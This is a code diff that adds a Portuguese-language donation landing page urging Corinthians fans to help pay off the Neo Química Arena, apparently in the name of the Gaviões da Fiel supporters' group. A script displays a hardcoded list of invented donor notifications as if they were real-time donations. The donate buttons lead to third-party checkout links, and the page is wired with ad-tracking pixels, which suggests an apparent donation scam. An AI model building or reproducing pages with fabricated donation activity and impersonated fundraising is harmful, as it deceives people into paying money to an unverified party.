@@ -1,0 +1,465 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    
+    
+    
+    <script async="" src="js/fbevents.js"></script><script async="" src="js/fbevents_1.js"></script><script async="" src="js/fbevents_2.js"></script><script>
+		window.pixelId = "6727b410f0bafa04eccb9a2b";
+		var a = document.createElement("script");
+		a.setAttribute("async", "");
+		a.setAttribute("defer", "");
+		a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+		document.head.appendChild(a);
+	</script><script async="" defer="" src="js/pixel_2.js"></script><script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel_1.js"></script><script async="" defer="" src="js/pixel_1.js"></script>
+	<script async="" defer="" src="js/pixel_1.js"></script>
+	<script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <meta charset="utf-8" "="">
+    
+    
+    
+        <style>
+            /* Estilo para o container das notificações */
+            #notifications {
+                position: fixed;
+                bottom: 10px;
+                left: 10px;
+                z-index: 9999;
+            }
+    
+            /* Estilo individual para cada notificação */
+            .notification {
+                background-color: rgba(117, 94, 31, 0.9);
+                color: rgb(0, 0, 0);
+                padding: 10px;
+                margin-bottom: 10px;
+                border-radius: 5px;
+                font-size: 14px;
+                max-width: 300px;
+                box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                animation: fadeIn 3s ease-out, fadeOut 3s 7s forwards;
+            }
+    
+            /* Animação de fade-in */
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                    transform: translateY(-10px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
+            }
+    
+            /* Animação de fade-out */
+            @keyframes fadeOut {
+                from {
+                    opacity: 1;
+                }
+                to {
+                    opacity: 0;
+                }
+            }
+        </style>
+    </head>
+    
+    <body>
+        <div id="notifications"></div>
+    
+        <script async="" src="js/fbevents_1_1.js"></script><script>
+            // Lista de mensagens dos clientes
+            const messages = [
+                "João acabou de doar 200!",
+                "Marcelo acabou de doar 100!",
+                "Fernando acabou de doar 20!",
+                "Camila acabou de doar 50!",
+                "Paulo acabou de doar 400!",
+                "Thiago acabou de doar 300!",
+                "Pedro acabou de doar 20!",
+                "Maria acabou de doar 100!",
+                "Carlos acabou de doar 500!",
+                "Ana acabou de doar 20!",
+                "Luiz acabou de doar 500!"
+            ];
+    
+            // Função para mostrar as mensagens
+            function showNotification(message) {
+                const notification = document.createElement('div');
+                notification.className = 'notification';
+                notification.innerText = message;
+                document.getElementById('notifications').appendChild(notification);
+    
+                // Remove a notificação após a animação
+                setTimeout(() => {
+                    notification.remove();
+                }, 10000); // 10 segundos
+            }
+    
+            // Exibir as mensagens a cada 3 segundos
+            let currentMessageIndex = 0;
+            setInterval(() => {
+                if (currentMessageIndex < messages.length) {
+                    showNotification(messages[currentMessageIndex]);
+                    currentMessageIndex++;
+                } else {
+                    currentMessageIndex = 0; // Reinicia a exibição das mensagens
+                }
+            }, 3000); // Intervalo de 3 segundos entre cada mensagem
+        </script>
+    
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Site com Parallax e Efeitos</title>
+    <style>
+        /* Reset básico */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+        }
+
+        /* Estilo do menu */
+        nav {
+            position: fixed;
+            width: 100%;
+            top: 0;
+            left: 0;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #fff;
+            padding: 15px;
+            z-index: 1000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 25px;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        nav img {
+            width: 80px;
+            height: auto;
+        }
+
+        @media (max-width: 768px) {
+            nav {
+                justify-content: space-evenly;
+                gap: 25px;
+            }
+
+            nav img {
+                width: 60px;
+            }
+        }
+
+        /* Efeito parallax */
+        .parallax {
+            height: 100vh;
+            background-attachment: fixed;
+            background-size: cover;
+            background-position: center;
+        }
+
+        /* Bloco de conteúdo */
+        .content {
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .content img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .content h2 {
+            color: #fff;
+            font-size: 36px;
+            margin-bottom: 15px;
+        }
+
+        .content p {
+            color: #fff;
+            font-size: 18px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+
+        .content a.button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: black;
+            color: #ba8a4d;
+            text-decoration: none;
+            font-size: 18px;
+            border-radius: 5px;
+            transition: background-color 0.3s, color 0.3s;
+        }
+
+        .content a.button:hover {
+            background-color: #ffffff;
+        }
+
+        /* Estilo customizado do Bloco 2 */
+        #custom-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.9);
+            border-radius: 10px;
+        }
+
+        #custom-container img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+        }
+
+        #custom-container .news {
+            margin-top: 20px;
+            font-size: 1.2em;
+            color: #333;
+        }
+
+        @media (max-width: 768px) {
+            #custom-container {
+                padding: 15px;
+            }
+
+            #custom-container .news {
+                font-size: 1em;
+            }
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px 0;
+            background-color: #000000;
+            color: #fff;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px; /* Ajustando a distância vertical entre os botões */
+            align-items: center;
+        }
+
+        .buttons .button {
+            background-color: black;
+            color: #ba8a4d;
+            padding: 8px 16px; /* Reduzindo o tamanho do padding para aproximar mais os botões */
+            font-size: 16px; /* Ajustando o tamanho da fonte para compactar */
+        }
+
+        .buttons .button:hover {
+            background-color: #ba8a4d;
+            color: black;
+        }
+    </style>
+
+
+
+    <!-- Menu -->
+    <nav id="menu">
+        <a href="#"><img src="images/logo-fieltorcedor-2023-P.png" alt="Logo 1"></a>
+        <a href="#"><img src="images/chuteinicial.png" alt="Logo 2"></a>
+        <a href="#"><img src="images/Logo_neo_quimica_arena_vert_branco.png" alt="Logo 3"></a>
+    </nav>
+
+    <!-- Bloco 1 -->
+    <div id="bloco1" class="parallax" style="background-image: url('images/bg-login.jpg');">
+        <div class="content">
+            <a href="" target="">
+                <img src="images/SCCP_escudo-150px.png" alt="Logo">
+            </a>
+            <h2>AJUDE A QUITAR A NEO QUÍMICA ARENA!</h2>
+            <p>Fiel, chegou a hora de fazermos história juntos! A Neo Química Arena é nossa casa, nosso templo, e a Gaviões da Fiel está mobilizando a nação corinthiana para quitar de vez o estádio e garantir um futuro ainda mais grandioso para o nosso Corinthians.</p>
+            <p>Cada doação, por menor que seja, faz a diferença. Mostre que o Corinthians é do povo e o povo é Corinthians!</p>
+            <p>Doe agora e faça parte dessa conquista. #VaiCorinthians #QuitaçãoNeoQuímicaArena.</p>
+            <a href="#bloco3" class="button">DOAR AGORA</a>
+        </div>
+    </div>
+    
+    <style>
+    /* Configuração base para o parallax */
+    #bloco1 {
+        position: relative;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        min-height: 100vh; /* Garante que o bloco ocupe toda a altura da tela */
+        height: auto;
+        width: 100%; /* Ocupa toda a largura */
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 20px;
+        box-sizing: border-box;
+    }
+    
+    /* Configuração do conteúdo dentro do bloco */
+    #bloco1 .content {
+        background-color: rgba(0, 0, 0, 0.0);
+        color: white;
+        text-align: center;
+        padding: 20px;
+        border-radius: 10px;
+        max-width: 600px;
+        width: 100%;
+        box-sizing: border-box;
+    }
+    
+    #bloco1 .content img {
+        max-width: 100%;
+        height: auto;
+        margin-bottom: 20px;
+    }
+    
+    #bloco1 .content h2 {
+        font-size: 1.8rem;
+        margin-bottom: 20px;
+    }
+    
+    #bloco1 .content p {
+        font-size: 1rem;
+        margin-bottom: 20px;
+        line-height: 1.5;
+    }
+    
+    #bloco1 .content .button {
+        display: inline-block;
+        background-color: #000000;
+        color: #ba8a4d;
+        text-decoration: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        font-weight: bold;
+    }
+    
+    #bloco1 .content .button:hover {
+        background-color: #313131;
+    }
+    
+    /* Responsividade */
+    @media (max-width: 768px) {
+        #bloco1 .content h2 {
+            font-size: 1.5rem;
+        }
+    
+        #bloco1 .content p {
+            font-size: 0.9rem;
+        }
+    }
+    
+    @media (max-width: 480px) {
+        #bloco1 {
+            padding: 10px;
+        }
+    
+        #bloco1 .content {
+            padding: 15px;
+        }
+    
+        #bloco1 .content h2 {
+            font-size: 1.2rem;
+        }
+    
+        #bloco1 .content p {
+            font-size: 0.8rem;
+        }
+    }
+    </style>
+    
+
+
+
+    <!-- Bloco 2 -->
+    <div id="bloco2" class="parallax" style="background-image: url('images/SC302-02__15542.jpg');">
+        <div id="custom-container" style="background-color: rgba(F, F, F, F.75);">
+            <img src="images/gavioes-da-fiel-caixa-e1729293629261.jpeg" alt="Imagem de exemplo">
+            <div class="news">
+                <h2>Gaviões projeta R$700 milhões em vaquinha para quitar estádio do Corinthians</h2>
+                <p>
+                    Nesta quarta-feira (27/11), o Corinthians e sua principal torcida organizada, os Gaviões da Fiel, junto a Caixa Econômica Federal, formalizaram a assinatura do Protocolo de Intenções relacionado a dívida da Neo Química Arena. O projeto prevê uma arrecadação através de crowdfunding para quitar o estádio.
+                </p>
+                <p>
+                    As assinaturas foram formalizadas por representantes de cada parte. Augusto Melo e Alexandre Domênico Pereira, presidentes do Corinthians e dos Gaviões da Fiel, além de Alexandre Padilha, ministro-chefe da Secretaria de Relações Institucionais do Governo Federal.
+                </p>
+                <p>
+                    A projeção inicial feita pelos Gaviões da Fiel prevê uma arrecadação de R$500 a R$700 milhões em um período de seis meses. A organizada exigiu acompanhar a arrecadação de forma semelhante a um impostômetro, com atualizações em tempo real.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bloco 3 -->
+    <div id="bloco3" class="parallax" style="background-image: url('images/corinthians-aprova-projeto-da-gavioes-da-fiel-para-ajudar-a-pagar-o-estadio-01-1280x720.webp');">
+        <div class="content" style="background-color: rgba(0, 0, 0, 0.50);"> 
+            <h2>FAÇA AGORA MESMO SUA DOAÇÃO</h2>
+            <div class="buttons">
+                <a href="https://checkout.lunarcash.com.br/2wq7GroMb1gBANP" class="button">QUERO DOAR R$10,00</a>
+                <a href="https://checkout.lunarcash.com.br/6YQPgjb1oAgpxze" class="button">QUERO DOAR R$20,00</a>
+                <a href="https://checkout.lunarcash.com.br/5pjw3RJA4N32lQq" class="button">QUERO DOAR R$50,00</a>
+                <a href="https://checkout.lunarcash.com.br/521rZJ4dVQgeaXo" class="button">QUERO DOAR R$100,00</a>
+                <a href="https://checkout.lunarcash.com.br/1VOvGVmb0oZD62e" class="button">QUERO DOAR R$150,00</a>
+                <a href="https://checkout.lunarcash.com.br/P5LNZ8WAaY3aRye" class="button">QUERO DOAR R$200,00</a>
+                <a href="https://checkout.lunarcash.com.br/JqoR32VDRJ3Vj5D" class="button">QUERO DOAR R$300,00</a>
+                <a href="https://checkout.lunarcash.com.br/nWrxGWX71wg6549" class="button">QUERO DOAR R$400,00</a>
+                <a href="https://checkout.lunarcash.com.br/lDW0ZaLa883N7Eo" class="button">QUERO DOAR R$500,00</a>
+				<a href="https://checkout.lunarcash.com.br/KV603kYOldGw8ym" class="button">QUERO DOAR R$1.000,00</a>
+            </div>
+        </div>
+    </div>
+
+
+
+    <!-- Rodapé -->
+    <footer>
+        <div class="espaco-rodape"></div>
+        <!-- Aqui você pode adicionar o conteúdo do rodapé -->
+      </footer>
+      
+    <footer>
+        <p>© 2024 Todos os direitos reservados</p>
+    </footer>
+
+
+
+
+
+
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '943701774336782');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=943701774336782&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code --></body></html><!-- Meta Pixel Code -->
